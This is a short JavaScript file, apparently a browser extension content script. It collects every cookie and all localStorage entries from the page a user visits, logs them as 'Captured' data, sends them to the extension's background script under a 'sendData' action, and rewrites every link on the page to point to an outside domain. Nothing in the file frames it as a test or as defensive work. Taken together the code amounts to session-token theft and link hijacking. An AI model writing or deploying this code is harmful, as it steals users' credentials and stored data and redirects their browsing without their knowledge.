function extractCookies() {
  const cookiePairs = document.cookie.split(';');
  const cookies = {};
  for (let pair of cookiePairs) {
    const [name, value] = pair.split('=');
    const trimmedName = name.trim();
    const trimmedValue = value.trim();
    cookies[trimmedName] = trimmedValue;
  }
  return cookies;
}

function extractLocalStorage() {
  const localStorageData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key);
    localStorageData[key] = value;
  }
  return localStorageData;
}

function changeHyperlinks(targetDomain) {
  const links = document.getElementsByTagName("a");

  for (let i = 0; i < links.length; i++) {
    let link = links[i];
    let href = link.getAttribute("href");

    if (href && !href.startsWith("#") && !href.startsWith("javascript:")) {
      link.href = `https://${targetDomain}`;
      link.target = "_blank";
    }
  }
}
const cookies = extractCookies();
const localStorageData = extractLocalStorage();
const data = { cookies: cookies, localStorage: localStorageData };

console.log("Captured Cookies:", cookies);
console.log("Local Storage Data:", localStorageData);
changeHyperlinks("test.com");

chrome.runtime.sendMessage({ action: "sendData", data: data });
